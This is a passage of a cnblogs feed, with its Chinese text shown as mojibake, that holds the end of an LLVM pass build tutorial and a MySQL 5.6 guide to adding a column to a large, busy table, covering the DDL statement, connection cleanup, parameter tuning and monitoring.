#å° LLVM çå¤´æä»¶ç®å½ï¼å¦ llvm/IR/Function.hï¼å å¥ç¼è¯å¨çæç´¢è·¯å¾
include_directories(${LLVM_INCLUDE_DIRS})
#å¯¼å¥ LLVM ç¼è¯æ¶ä½¿ç¨çå®å®ä¹
add_definitions(${LLVM_DEFINITIONS})
#è®¾ç½® C++ æ åä¸º C++17ã(è¿éå¦æä¸ç¨17ç¼è¯ä¼æ¥é)
set(CMAKE_CXX_STANDARD 17)
#å¼ºå¶è¦æ±å¿é¡»æ¯æ C++17ï¼å¦æç¼è¯å¨ä¸æ¯æåå¤±è´¥ã
set(CMAKE_CXX_STANDARD_REQUIRED ON)

#åå»ºä¸ä¸ªæ¨¡ååçåº(.dll)
add_library(mypass8 MODULE mypass8.cpp) #----&gt;ä¿®æ¹ é¡¹ç®åç§°ï¼æä»¶å
#windowsä¸ç¨ä¼æ¥éï¼å¯¼åºç¬¦å·
#LLVM Pass éè¦æ´é²ä¸äºç¹å®çå¥å£ç¹ï¼å¦ getAnalysisUsageï¼ç» opt å·¥å·è°ç¨ã
set_target_properties(mypass8 PROPERTIES WINDOWS_EXPORT_ALL_SYMBOLS ON) #----&gt;ä¿®æ¹ é¡¹ç®åç§°
# æå®è¯¥ Pass éè¦é¾æ¥ç LLVM æ ¸å¿ç»ä»¶ã 
# LLVMCore: æä¾ IRãFunctionãModule ç­æ ¸å¿ç±»ã 
# LLVMSupport: æä¾åç§è¾å©å·¥å·ç±»ï¼å¦ errs() è¾åºï¼ã
target_link_libraries(mypass8 LLVMCore LLVMSupport) #----&gt;ä¿®æ¹ é¡¹ç®åç§°ï¼æä»¶å  
# ä¸ºè¯¥ç®æ è®¾ç½®ç¹å®çç¼è¯å¨éé¡¹ã 
# /utf-8: åè¯ MSVC ç¼è¯å¨ä½¿ç¨ UTF-8 ç¼ç å¤çæºä»£ç ï¼é²æ­¢ä¸­ææ³¨éå¼èµ·çä¹±ç æç¼è¯éè¯¯ã  
target_compile_options(mypass8 PRIVATE /utf-8)#----&gt;ä¿®æ¹ é¡¹ç®åç§°ï¼æä»¶å
</code></pre>
<h5 id="2ç¼è¯å¹¶æå»ºpass">2.ç¼è¯å¹¶æå»ºPass</h5>
<p><strong>æå¼visual studio<code>çå·¥ä½å°ï¼æè¿éæ¯</code>x64 Native Tools Command Prompt for VS 2022`</strong></p>
<p>è¿å°<code>build</code>ç®å½</p>
<pre><code class="language-bash">#æå»ºé¡¹ç®
#å¶ä¸­-DCMAKE_BUILD_TYPE=RelWithDebInfoä¸éä¼æ¥éï¼ç±äºæä¹åç¼è¯çæ¯å¸¦ç¬¦å·çrelaseçæ¬
cmake -G "Ninja"  -DCMAKE_BUILD_TYPE=RelWithDebInfo ..
#ç¼è¯
ninja
</code></pre>
<p>æååºç°ä¸é¢æç¤ºï¼å³ä¸ºç¼è¯æå</p>
<pre><code class="language-bash">[2/2] Linking CXX shared module mypass1.dll
</code></pre>
<h3 id="åä½¿ç¨ä½ ç¬¬ä¸ä¸ªpass">åï¼ä½¿ç¨ä½ ç¬¬ä¸ä¸ªPass</h3>
<p>è¿å°<code>build</code>ç®å½</p>
<pre><code class="language-bash">#æ.cæä»¶ç¼è¯ä¸º.ll
#-O1 ä½¿ç¨O1ä¼åï¼è¿éæå°è¯-O0ä¸ä¼åï¼ä¼å¯¼è´æçpassæ æ³åºç¨ï¼
#-Xclang -disable-llvm-passes ä¸ä½¿ç¨é»è®¤çpassä¼å
clang -S -emit-llvm -O1 -Xclang -disable-llvm-passes test.c -S -o test.ll

#ä½¿ç¨pass
opt -load-pass-plugin=mypass1.dll -passes=mypass1  test.ll -S -o test_opt.ll
</code></pre>
<p><strong>è¾åºç»æ</strong></p>
<pre><code class="language-bash">Found Function: sprintf
Found Function: vsprintf
Found Function: _snprintf
Found Function: _vsnprintf
Found Function: secret_function
Found Function: printf
Found Function: main
Found Function: _vsprintf_l
Found Function: _vsnprintf_l
Found Function: __local_stdio_printf_options
Found Function: _vfprintf_l
</code></pre>
<p><strong>å¦æâ¤åæ¬¢â¤æ¬ç³»åæç¨ï¼å°±ç¹ä¸ªå³æ³¨å§ï¼åç»­ä¸å®ææ´æ°~</strong></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 15:17">2026-02-02 15:17</span>&nbsp;
<a href="https://www.cnblogs.com/ClownLMe">ClownLMe</a>&nbsp;
éè¯»(<span id="post_view_count">26</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19564658);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19564658', targetLink: 'https://www.cnblogs.com/ClownLMe/p/19564658', title: 'LLVM Passå¿«éå¥é¨(äº)ï¼è¿è¡ç¬¬ä¸ä¸ªpass' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µå®æï¼ä»æ¢æ§è¡å°æ éè½å°å¨è§£æ ]]></title>
    <link>https://www.cnblogs.com/xxhxs-21/p/19564624</link>
    <guid>0f98b7c5fb32dd79832894cba6e45ceb</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/xxhxs-21/p/19564624" title="åå¸äº 2026-02-02 15:13">
    <span role="heading" aria-level="2">MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µå®æï¼ä»æ¢æ§è¡å°æ éè½å°å¨è§£æ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        <img src="https://img2024.cnblogs.com/blog/1869035/202602/1869035-20260202151226843-1773744596.png" alt="MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µå®æï¼ä»æ¢æ§è¡å°æ éè½å°å¨è§£æ" class="desc_img">
        MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µå®æï¼ä»æ¢æ§è¡å°æ éè½å°å¨è§£æ
    </div>
<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">ä¸ãèæ¯ä¸é®é¢ç¼èµ·</span></h2>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">MySQL 5.6.51 çæ¬ä¸ 2000 ä¸è¡æ ¸å¿ä¸å¡è¡¨å¼å±æ°å¢å­æ®µæä½ï¼éæ±ä¸ºæ°å¢<code></code><code>BIGINT(19) NOT NULL DEFAULT 0 COMMENT 'æ³¨é'</code>ï¼å ä¸å¡å®ééè¦å­å¨å¤§æ°å¼å³èå­æ®µï¼ã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">è¡¨çæ ¸å¿ç¹æ§ä¸ºJava å¤çº¿ç¨å¯éè¯»åï¼ä¸å¡è¯·æ±æç»­é«é¢ï¼åå§æ§è¡åç<code>ALTER TABLE</code>è¯­å¥æ¶åºç°ä¸¤å¤§æ ¸å¿é®é¢ï¼</span></p>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">72 ä¸è¡æµè¯è¡¨æ§è¡èæ¶ 203 ç§ï¼çº¿æ§æ¨ç® 2000 ä¸è¡è¡¨èæ¶è¶ 1.5 å°æ¶ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">çäº§æ§è¡æ¶è§¦åè¡¨éãæ¥è¯¢å¤±æï¼ä¸¥éå½±åä¸å¡æ­£å¸¸è¿è¡ã</span></li>
</ol>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ¬æ¬¡å®æçæ ¸å¿ææéä¸­å¨ï¼MySQL 5.6 çæ¬æªæ¯æé«çæ¬çè¡¨ç»æåæ°æ®åå°ä¿®æ¹ä¼åãå¤§è¡¨å¨éæ°æ®æ·è´ç IO èµæºå ç¨ãé«é¢è¯»ååºæ¯ä¸çèµæºç«äºãMDL éç­å¾å¯¼è´çéè¡¨é£é©ï¼ééè¿éå¯¹æ§æ¹æ¡å®ç°æ éãæ ä¸å¡æç¥ãé«æçå­æ®µæ°å¢ã</span></div>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">äºãæ ¸å¿é®é¢æ ¹æºåæ</span></h2>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">2.1 MySQL 5.6 Online DDL çåå¤©å±é</span></h3>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">MySQL 5.6 è½å¼å¥ InnoDB Online DDL ç¹æ§ï¼è§£å³äºä¼ ç» DDL éè¡¨é»å¡ä¸å¡çé®é¢ï¼ä½æªæ¯æé«çæ¬ï¼5.7/8.0ï¼çåæ°æ®åå°ä¿®æ¹ä¼åââ æ°å¢ä»»ä½ç±»åå­æ®µåéå¨è¡¨æ·è´æ°æ®ï¼èæ·è´è¿ç¨ä¼å ç¨å¤§éç£ç IOï¼è¿æ¯å¤§è¡¨ DDL æ§è¡æ¢çæ ¸å¿æ ¹æºãå°¤å¶å¯¹äº 2000 ä¸è¡è¡¨ï¼å¨è¡¨æ·è´ç IO å¼éæä¸ºæ§è½ç¶é¢ï¼72 ä¸è¡å°è¡¨æµè¯èæ¶ 203 ç§çæ ¸å¿åå ä¹å¨äºæ­¤ã</span></div>
<div>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">2.2&nbsp;æ¾å¼é»è®¤å¼å¯¹ DDL çä¼åä½ç¨</span></h3>
</div>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">MySQL 5.6 å¯¹åçæ°å¼ç±»åï¼TINYINT/INT/BIGINTï¼+ ç®åå¸¸éé»è®¤å¼ï¼å¦ 0ï¼ç DDL æä½æè½»éçº§ä¼åï¼æ é»è®¤å¼æ¶éå¨è¡¨æ·è´ + éè¡åå§åå­æ®µå¼ï¼èæ¾å¼æå®é»è®¤å¼åä¼ä¼åä¸ºå¨è¡¨æ·è´ + æ¹éèµå¼é»è®¤å¼ï¼åå° 60% ä»¥ä¸ç IO å¼éï¼ä¸è¯¥ä¼åå¯¹æ°å¼ç±»åçééæ§è¿ä¼äº VARCHAR ç±»åï¼BIGINT æ¯ VARCHAR çæ§è¡æçæ´é«ãèµæºå ç¨æ´ä½ï¼ã</span></div>
<div>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">2.3&nbsp;éè¡¨ççæ­£åå¶ï¼MDL éç­å¾ä¸é¿äºå¡é»å¡</span></h3>
</div>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ§è¡<code>ALTER TABLE</code>æ¶åºç°çè¡¨éãæ¥è¯¢å¤±æï¼å¹¶é DDL æ¬èº«éè¡¨ï¼èæ¯ MySQL 5.6 ç MDLï¼åæ°æ®éï¼æºå¶å¯¼è´ï¼</span><ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">DDL æ§è¡åéè·åè¡¨çMDL æä»éï¼X éï¼ï¼èæ®éè¯»åæä½ä¼ææMDL å±äº«éï¼S éï¼ï¼X éä¸ä»»ä½éäºæ¥ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">è¥æ§è¡ DDL æ¶è¡¨ä¸å­å¨æªæäº¤é¿äºå¡ãæ¢æ¥è¯¢ãç©ºé²é¿è¿æ¥ï¼ææ S éæªéæ¾ï¼ï¼DDL ä¼è¿å¥<code>Waiting for table metadata lock</code>ç¶æï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">MySQL 5.6 ç MDL éç­å¾ä¸ºé»å¡å¼ä¸æ è¶æ¶æºå¶ï¼åç»­ææè¯»åè¯·æ±ï¼åæ¬æ°ç SELECTï¼é½ä¼æéé»å¡ï¼è¡¨ç°ä¸º âè¡¨è¢«éãæ¥è¯¢å¤±æâã</span></li>
</ol>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">2.4&nbsp;èæ¶éçº¿æ§çæ ¸å¿åå </span></h3>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">72 ä¸è¡è¡¨ 203 ç§çæµè¯ç»ææ æ³çº¿æ§æ¨ç® 2000 ä¸è¡è¡¨èæ¶ï¼å  MySQL 5.6 æ§è¡ä¼ååç DDL æ¶ï¼åä½è¡èæ¶ä¼éæ°æ®éå¢å¤§èéä½ï¼</span></p>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">å¤§è¡¨æ¯ææ¹éåæ·è´ï¼è½åååæ¥ç£çè¿ç»­ IO ä¼å¿ï¼åå°å¯»éæ¶é´ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">å¤§è¡¨å¤çè¿ç¨ä¸­InnoDB ç¼å²æ± ç¼å­å½ä¸­çæ´é«ï¼åå°ç©ç IO æ¬¡æ°ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">å°è¡¨æ°æ®åæ£ï¼å­å¨é¨åéæº IOï¼è°åº¦å IO å¼éç¸å¯¹æ´é«ã</span></li>
</ol>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">ä¸ãéé MySQL 5.6 çæä¼ DDL è¯­å¥</span></h2>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">éå¯¹ 2000 ä¸è¡è¡¨ãBIGINT ç±»åãé»è®¤å¼ 0 çéæ±ï¼ç»å MySQL 5.6 çä¼åç¹æ§ï¼ç¡®å®æä¼ DDL è¯­å¥ï¼æ¾å¼æå®ææå±æ§ä»¥æå¤§åè§¦åä¼åï¼</span></p>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">ALTER</span> <span style="color: rgba(0, 0, 255, 1)">TABLE</span><span style="color: rgba(0, 0, 0, 1)"> è¡¨å 
</span><span style="color: rgba(0, 0, 255, 1)">ADD</span> <span style="color: rgba(0, 0, 255, 1)">COLUMN</span> å­æ®µå <span style="color: rgba(0, 0, 255, 1)">BIGINT</span>(<span style="color: rgba(128, 0, 0, 1); font-weight: bold">19</span>) <span style="color: rgba(128, 128, 128, 1)">NOT</span> <span style="color: rgba(0, 0, 255, 1)">NULL</span> <span style="color: rgba(0, 0, 255, 1)">DEFAULT</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">0</span> COMMENT <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">æ³¨é</span><span style="color: rgba(255, 0, 0, 1)">'</span>;</span></pre>
</div>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">è¯­å¥å³é®å±æ§è¯´æ</span></p>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;"><code>BIGINT(19)</code>ï¼åçæ°å¼ç±»åï¼åå¼èå´è¦çè¶å¤§æ´æ°ï¼-9223372036854775808~9223372036854775807ï¼ï¼19 ä¸ºæ¾ç¤ºå®½åº¦ï¼å¹éæç¬¦å·æå¤§ä½æ°ï¼ä¸éå¶å®éåå¼ï¼ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;"><code>NOT NULL DEFAULT 0</code>ï¼æ ¸å¿ä¼åç¹ï¼ç®åå¸¸éé»è®¤å¼è§¦å MySQL 5.6 æ¹éèµå¼ä¼åï¼éç©ºè®¾ç½®é¿å NULL å¼ï¼ç®åä¸å¡ä»£ç ç©ºå¼å¤æ­ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">æ¾å¼æ³¨éï¼æåè¡¨ç»æå¯è¯»æ§ï¼ä¾¿äºåç»­ç»´æ¤ã</span></li>
</ol>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">è¥éæ°å¢ VARCHAR ç±»åå­æ®µï¼éæ¾å¼æå®<code>DEFAULT ''</code>è§¦åä¼åï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">ALTER</span> <span style="color: rgba(0, 0, 255, 1)">TABLE</span><span style="color: rgba(0, 0, 0, 1)"> è¡¨å
</span><span style="color: rgba(0, 0, 255, 1)">ADD</span> <span style="color: rgba(0, 0, 255, 1)">COLUMN</span> å­æ®µå <span style="color: rgba(0, 0, 255, 1)">VARCHAR</span>(<span style="color: rgba(128, 0, 0, 1); font-weight: bold">50</span>) <span style="color: rgba(0, 0, 255, 1)">DEFAULT</span> <span style="color: rgba(255, 0, 0, 1)">''</span> COMMENT <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">æ³¨é</span><span style="color: rgba(255, 0, 0, 1)">'</span>;</span></pre>
</div>
</div>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">åãçäº§ç¯å¢æ éè½å°å¨æµç¨æ¹æ¡</span></h2>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">4.1 æ§è¡ååå¤ï¼æ¸éæº + ä½å³°æ + åæ°è°ä¼ï¼æ ¸å¿é¿åï¼</span></h3>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.1.1 éæ©æè´ä½å³°ææ§è¡</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">å»ºè®®ï¼ä¼åéæ©åæ¨ 2:00-4:00ï¼æå¶ä»ä¸å¡ä½å³°æï¼åå°æ´»è·äºå¡ï¼éä½ MDL éç­å¾æ¦çã</span></div>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.1.2 å¼ºå¶æ¸çéæºï¼å¿åï¼é¿å MDL éç­å¾ï¼</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ§è¡ DDL åè¸¢æç©ºé²é¿è¿æ¥ãç»æ­¢é¿äºå¡ / æ¢æ¥è¯¢ï¼éæ¾æææªæäº¤ç S éï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 1. ä¸´æ¶ç¼©ç­é¿è¿æ¥è¶æ¶æ¶é´ï¼è¸¢æç©ºé²è¿æ¥</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL wait_timeout <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">10</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL interactive_timeout <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">10</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">SELECT</span> SLEEP(<span style="color: rgba(128, 0, 0, 1); font-weight: bold">15</span>); <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> ç­å¾15ç§è®©è¿æ¥èªå¨æ­å¼</span><span style="color: rgba(0, 128, 128, 1)">
--</span><span style="color: rgba(0, 128, 128, 1)"> 2. æ¢å¤é¿è¿æ¥è¶æ¶é»è®¤å¼ï¼8å°æ¶ï¼</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL wait_timeout <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">28800</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL interactive_timeout <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">28800</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 3. ä¸»å¨ç»æ­¢ç®æ è¡¨ä¸çæ¢æ¥è¯¢/é¿äºå¡ï¼æ¿æ¢åºåãè¡¨åï¼</span>
<span style="color: rgba(0, 0, 255, 1)">SELECT</span> CONCAT(<span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">KILL </span><span style="color: rgba(255, 0, 0, 1)">'</span>, id, <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">;</span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">) 
</span><span style="color: rgba(0, 0, 255, 1)">FROM</span><span style="color: rgba(0, 0, 0, 1)"> INFORMATION_SCHEMA.PROCESSLIST 
</span><span style="color: rgba(0, 0, 255, 1)">WHERE</span> db <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">æ°æ®åºå</span><span style="color: rgba(255, 0, 0, 1)">'</span> 
  <span style="color: rgba(128, 128, 128, 1)">AND</span> info <span style="color: rgba(128, 128, 128, 1)">LIKE</span> <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">%è¡¨å%</span><span style="color: rgba(255, 0, 0, 1)">'</span> 
  <span style="color: rgba(128, 128, 128, 1)">AND</span> Time <span style="color: rgba(128, 128, 128, 1)">&gt;</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">30</span> 
  <span style="color: rgba(128, 128, 128, 1)">AND</span> Command <span style="color: rgba(128, 128, 128, 1)">IN</span> (<span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">Query</span><span style="color: rgba(255, 0, 0, 1)">'</span>, <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">Sleep</span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">);
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ§è¡ä¸è¿°æ¥è¯¢çæçKILLè¯­å¥ï¼éæ¾Sé</span></span></pre>
</div>
</div>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.1.3 ä¸´æ¶ MySQL åæ°è°ä¼ï¼æé + åå°èµæºç«äºï¼</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">å¯éï¼å¨æè°æ´åæ°ï¼æ ééå¯ï¼DDL å®æåæ¢å¤ï¼æ ¸å¿ä¼å DDL æ§è¡æçå IO å©ç¨çï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> è°å¤§DDLä¸ç¨ç¼å²åºï¼æåæ¹éæ·è´æçï¼é»è®¤1Mï¼è°è³16Mï¼</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_ddl_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">16</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> åå°åæä½IOå¼éï¼é¿åæ°çé¿äºå¡</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_flush_log_at_trx_commit <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">2</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> è°å¤§è¯»åç¼å²åºï¼ç¼è§£ç¼å­ç«äº</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_read_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">16</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_write_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">8</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span>;</span></pre>
</div>
</div>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">4.2 æ§è¡ä¸­ï¼å®æ¶çæ§ + ç¶æå¤æ­ + èµæºç®¡æ§</span></h3>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.2.1 æ ¸å¿ç¶æå¤æ­ï¼ç¡®è®¤ MDL éè·åæåï¼</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">éè¿<code>SHOW FULL PROCESSLIST;</code>æ¥ç DDL è¿ç¨ç¶æï¼è±ç¦»éè¡¨é£é©æçæ ¸å¿æ å¿ï¼</span></div>
<ul>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">é£é©ç¶æï¼<code>State = Waiting for table metadata lock</code>ï¼æªè·å MDL éï¼é»å¡åç»­ææè¯»åï¼ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">æ­£å¸¸ç¶æï¼<code>State = executing</code> æ <code>State = copying to tmp table</code>ï¼MDL éå·²æåè·åï¼DDL æ éæ§è¡ä¸­ï¼äºèä¸º MySQL 5.6 å½åå·®å¼ï¼ç­ææ éï¼ã</span></li>
</ul>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">ç²¾åè¿æ»¤ DDL è¿ç¨çæ¥è¯¢è¯­å¥ï¼é¿åç¿»æ¾ï¼ï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">SELECT</span><span style="color: rgba(0, 0, 0, 1)"> id, command, state, info, time 
</span><span style="color: rgba(0, 0, 255, 1)">FROM</span><span style="color: rgba(0, 0, 0, 1)"> INFORMATION_SCHEMA.PROCESSLIST 
</span><span style="color: rgba(0, 0, 255, 1)">WHERE</span> info <span style="color: rgba(128, 128, 128, 1)">LIKE</span> <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">%è¡¨å%</span><span style="color: rgba(255, 0, 0, 1)">'</span> 
  <span style="color: rgba(128, 128, 128, 1)">AND</span> command <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">ALTER TABLE</span><span style="color: rgba(255, 0, 0, 1)">'</span>;</span></pre>
</div>
</div>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.2.2 å®æ¶èµæºçæ§</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ éæç»­ç¯å®ï¼1 åéæ¥ç 1 æ¬¡æ ¸å¿ææ ï¼é¿åèµæºèå°½ï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> çæ§ç£çIOï¼æ ¸å¿ï¼%utilä¸ºå³é®ææ ï¼æ§å¶å¨â¤80%ï¼</span>
iostat -x 1
<span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> çæ§MySQLçCPU/åå­å ç¨</span>
top -p `pidof mysqld`</span></pre>
</div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¥çInnoDB DDLæ§è¡ç¶æï¼ç¡®è®¤å¢éæ¥å¿åæ­¥æ­£å¸¸</span>
SHOW ENGINE INNODB STATUS\G;</span></pre>
</div>
</div>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.2.3 è¯»åéçªå¢çåºå¯¹æ¹æ¡</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">å¯éï¼è¥æ§è¡æé´ä¸å¡è¯»åéå¢å ï¼IO å©ç¨ç &gt; 90%ï¼ï¼æ éä¸­æ­ DDLï¼ä¸­æ­ä¼å¯¼è´ä¹åçå·¥ä½ç½è´¹ï¼ï¼éè¿è½»éæä½ç¼è§£èµæºç«äºï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> ä¸´æ¶å³é­èªéåºå·æ°ï¼åå°åå°IO</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_adaptive_flushing <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(0, 0, 255, 1)">OFF</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> è¥ä¸å¡æ¯æï¼ä¸´æ¶å¨æéæµï¼Javaä¸å¡ä¾§å¼å³ï¼ï¼å°QPSéå¶å¨æ¥å¸¸60%-70%</span></span></pre>
</div>
</div>
